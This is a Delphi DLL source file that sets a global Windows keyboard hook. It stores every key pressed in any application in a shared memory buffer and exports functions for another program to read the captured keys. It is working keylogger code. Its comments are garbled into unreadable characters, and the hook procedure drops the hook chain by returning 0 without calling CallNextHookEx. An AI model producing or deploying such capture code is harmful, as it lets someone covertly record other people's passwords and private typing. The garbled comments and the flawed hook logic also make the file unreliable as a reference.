unit UnitDll;

interface

uses Windows;

const BUFFER_SIZE = 16 * 1024; // �ļ�ӳ�䵽�ڴ�Ĵ�С
const HOOK_MEM_FILENAME = 'MEM_FILE'; // ӳ���ļ���
const HOOK_MUTEX_NAME = 'MUTEX_NAME'; // ������

type
  // ����ṹ
  TShared = record
    Keys: array[0..BUFFER_SIZE] of Char;
    KeyCount: Integer;
  end;
  // ����ṹָ��
  PShared = ^TShared;

var
  MemFile, HookMutex: THandle;  // �ļ�����ͻ�����
  hOldKeyHook: HHook; // ���ӱ���
  Shared: PShared; // �������

implementation



// ��Ҫ�����̹��ӻص�
function KeyHookProc(iCode: Integer; wParam: WPARAM;
  lParam: LPARAM): LRESULT; stdcall; export;
const
  KeyPressMask = $80000000;
begin
  if iCode < 0 then
    Result := CallNextHookEx(hOldKeyHook, iCode, wParam, lParam)
  else
  begin
    if ((lParam and KeyPressMask) = 0) then
    begin
      // ������Ϣ����
      Shared^.Keys[Shared^.KeyCount] := Char(wParam and $00FF);
      Inc(Shared^.KeyCount);
      // �����ڴ��޶���С������
      if Shared^.KeyCount >= BUFFER_SIZE - 1 then
        Shared^.KeyCount := 0;
    end;
    result:=0;
  end;
end;

// ��װ����
function EnableKeyHook: BOOL; export;
begin
  Shared^.KeyCount := 0;
  if hOldKeyHook = 0 then
  begin
    // ���ù��ӹ���
    {WH_KEYBOARD: ��װ���Ǽ��̹��� KeyHookProc: ��Ϣ�ص�, HInstance: �ص�����ʵ�� �߳�ID}
    hOldKeyHook := SetWindowsHookEx(WH_KEYBOARD, KeyHookProc, HInstance, 0);
  end;
  Result := (hOldKeyHook <> 0);
end;

{�������ӹ��˺���}
function DisableKeyHook: BOOL; export;
begin
  if hOldKeyHook <> 0 then
  begin
    UnHookWindowsHookEx(hOldKeyHook);
    hOldKeyHook := 0;
    Shared^.KeyCount := 0;
  end;
  Result := (hOldKeyHook = 0);
end;


// �õ���ö��ٰ���
function GetKeyCount: Integer; export;
begin
  Result := Shared^.KeyCount;
end;

// �õ���I������
function GetKey(index: Integer): Char; export;
begin
  Result := Shared^.Keys[index];
end;

// ��հ���
procedure ClearKeyString; export;
begin
  Shared^.KeyCount := 0;
end;

// ���������б�
exports
  EnableKeyHook,
  DisableKeyHook,
  GetKeyCount,
  ClearKeyString,
  GetKey;

initialization
  // �������������DLLֻ����һ�����̿���ʹ��
  HookMutex := CreateMutex(nil, True, HOOK_MUTEX_NAME);
  // ���ļ�ӳ��
  MemFile := OpenFileMapping(FILE_MAP_WRITE, False, HOOK_MEM_FILENAME);
  // ��������ڸ��ļ�ӳ���򴴽�
  if MemFile = 0 then
    MemFile := CreateFileMapping($FFFFFFFF, nil, PAGE_READWRITE, 0, SizeOf(TShared), HOOK_MEM_FILENAME);
  // �ļ�ӳ���ڴ�
  Shared := MapViewOfFile(MemFile, File_MAP_WRITE, 0, 0, 0);
  // �ͷŻ������
  ReleaseMutex(HookMutex);
  // �رջ�����
  CloseHandle(HookMutex);

finalization
  // �������ӹ���
  if hOldKeyHook <> 0 then
    DisableKeyHook;
  // �ͷ�ӳ��
  UnMapViewOfFile(Shared);
  // �ر�ӳ���ļ�
  CloseHandle(MemFile);
end.

